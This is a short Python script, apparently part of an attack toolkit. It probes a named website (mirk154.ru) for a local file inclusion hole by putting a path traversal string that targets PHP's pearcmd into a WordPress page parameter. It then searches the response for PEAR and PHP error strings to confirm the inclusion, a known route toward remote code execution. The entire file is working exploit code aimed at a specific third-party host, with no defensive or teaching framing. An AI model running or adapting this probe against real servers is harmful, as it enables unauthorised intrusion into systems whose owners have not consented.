import re
from core import vuln

h = "mirk154.ru"
base = "https://" + h
one = "page-templates/../../../../usr/local/lib/php/pearcmd"
enc = vuln._denc(one)
url = base + "/?page_id=4473&pagename=" + enc
r = vuln._req("POST", url, body=b"", ctype="application/x-www-form-urlencoded")
t = r.text or ""
print(r.status_code, len(t))
for w in ["PEAR", "pearcmd", "Commands", "Warning", "Fatal", "Notice", "config-create"]:
    n = t.count(w)
    if n:
        i = t.find(w)
        print(w, n, "->", repr(t[max(0, i - 60):i + 120]))